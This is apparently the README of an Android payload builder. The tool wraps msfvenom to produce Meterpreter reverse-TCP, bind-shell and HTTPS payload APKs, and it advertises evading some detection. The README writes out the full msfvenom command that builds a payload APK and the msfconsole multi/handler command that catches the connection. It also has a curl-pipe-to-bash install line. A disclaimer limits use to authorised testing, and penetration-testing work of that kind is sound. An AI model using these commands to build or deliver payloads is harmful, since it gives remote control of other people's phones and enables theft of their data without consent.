# DROIDX — Android Payload Builder

**Generate Android Meterpreter payloads with an interactive menu. Works with or without Metasploit.**

Part of the **AdhiHub** security toolkit.

---

## What It Does

DroidX helps you create Android APK payloads for authorized penetration testing:

| Payload Type | What It Does |
|-------------|-------------|
| **Reverse TCP** | Target phone connects back to you (most common) |
| **Bind Shell** | Opens a port on the target phone — you connect to it |
| **HTTPS** | Encrypted reverse connection (evades some detection) |

If **msfvenom** is installed: DroidX generates the actual APK for you.
If **msfvenom** is NOT installed: DroidX shows you the exact command to copy-paste.

---

## One-Line Install

```bash
curl -fsSL https://raw.githubusercontent.com/AdhiHub/droidx/main/install.sh | bash
```

After install:

```bash
droidx
```

---

## How to Use

```bash
# Interactive menu
droidx

# Help
droidx -h
```

### Menu Options

1. **Reverse TCP** — You need LHOST + LPORT. Target connects to you.
2. **Bind Shell** — You need LHOST + LPORT. You connect to target.
3. **HTTPS** — Encrypted reverse connection (needs certificate setup)
4. **List Payloads** — Shows common Android Meterpreter payloads
5. **Help** — Usage info

### What You Enter

```
LHOST: 192.168.1.5      # Your IP (the listener)
LPORT: 4444              # Your port (the listener)
```

---

## What The Output Looks Like

```
LHOST: 192.168.1.5
LPORT: 4444

[+] Payload: android/meterpreter/reverse_tcp

[+] LHOST: 192.168.1.5
[+] LPORT: 4444

[+] Run this to generate APK:
    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o /tmp/payload.apk

[+] Then start your listener:
    msfconsole -q -x "use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; exploit"
```

---

## Requirements

- **Linux** or **Termux** (Android)
- Bash 4+
- Optional: Metasploit Framework (msfvenom + msfconsole)

---

## Run Without Installing

```bash
git clone https://github.com/AdhiHub/droidx.git
cd droidx
chmod +x droidx.sh
./droidx.sh
```

---

> **⚠️ DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY**
>
> Use at your own risk. Developer(s) assume NO liability.
> Only generate payloads for devices you own or have explicit written permission to test.
> Deploying malware on devices without consent is a serious crime.
